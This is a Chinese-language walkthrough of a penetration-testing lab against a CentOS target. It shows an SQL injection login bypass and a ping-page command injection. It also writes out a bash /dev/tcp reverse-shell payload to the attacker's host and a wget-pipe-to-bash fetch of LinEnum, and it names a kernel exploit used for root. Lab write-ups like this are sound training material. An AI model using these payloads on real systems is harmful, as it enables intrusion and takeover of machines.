# 0x00 环境

攻击主机：Kali   IP：192.168.20.3

目标主机：CentOS   IP：192.168.20.6

使用工具：

  • nmap
  • netdiscover/arp-scan
  • dirb
  • burpsuite
  • LinEnum(https://github.com/rebootuser/LinEnum)，其用法地址 (https://github.com/Jewel591/OSCP-Pentest-Methodologies/tree/master/PostExploit/File-Upload-Download)

# 0x01 信息收集

# 主机发现

使用 arp-scan 扫出目标主机 IP：192.168.20.6

# 端口扫描

使用 nmap 扫描发现开放了 22、80、443、3306 等端口。

目录扫描也没发现什么可以利用的东西，80 端口有个简单的登录页面。

查看源码发现用户名 Administrator。尝试爆破无果。

# 0x02 漏洞利用

# 漏洞利用

登录爆破无果，那只能试试测试登录页面有什么漏洞了，登录框常见有 SQL 注入漏洞，于是尝试注入，发现 password 字段可以通过 ' or 1=1 # 绕过登录，跳转到一个页面。

很明显是个执行 ping 命令的页面，首先想到是命令执行，输入 127.0.0.1 && whoami 。能够返回信息，妥了。

# getshell

通过执行命令 127.0.0.1;bash -i >& /dev/tcp/192.168.20.3/9001 0>&1 并提交，kali 利用 nc 监听 9001 端口，成功反弹 shell。

# 提权

前面扫描端口的时候发现开放了 3306 端口，于是着手找数据库账号密码。随后在 index.php 文件中找到数据库账号密码 john/hiroshima。

连接数据库： mysql -ujohn -phiroshima ，发现 webapp 数据库的 users 表中有这些信息，但多次测试好像没什么用处。

做到这里就无从下手了，剩下的步骤均是参考网上的教程做的。

使用 python 搭建简单的 web 服务，用于上传 LinEnum.sh 脚本： python -m SimpleHTTPServer 80 。

根据 LinEnum.sh 脚本的用法，在拿到的反弹 shell 上使用 wget 命令： wget -qO - http://192.168.20.3/Desktop/LinEnum.sh | bash > /tmp/linenum.txt ，下载脚本并通过管道传输到 bash，然后输出重定向到 linenum.txt 文件上。

然后重点关注这几点：

  1. 运行的是什么操作系统、内核版本？
  2. 有哪些用户可用？
  3. 他们中是否有人有 sudo 权限？
  4. 是否有任何 SUID/SGID 二进制文件？
  5. 哪些文件是我的用户可以访问 / 写入的？

这里常规的提权方法（password/shadow 文件、Cron、SUID 等）都没行，所以只好采用内核提权，根据收集都得信息，目标主机是 CentOS 4.5，内核版本为 2.6.9-55，32 位操作系统，所以使用 searchsploit 搜索看看：

使用命令 searchsploit -x 9542 查看第一个 exp 的详情。

cd 到 /tmp 目录，利用 wget 拷贝该 exp 上传到目标靶机上，编译并执行即可完成提权。

成功拿到 root 权限！
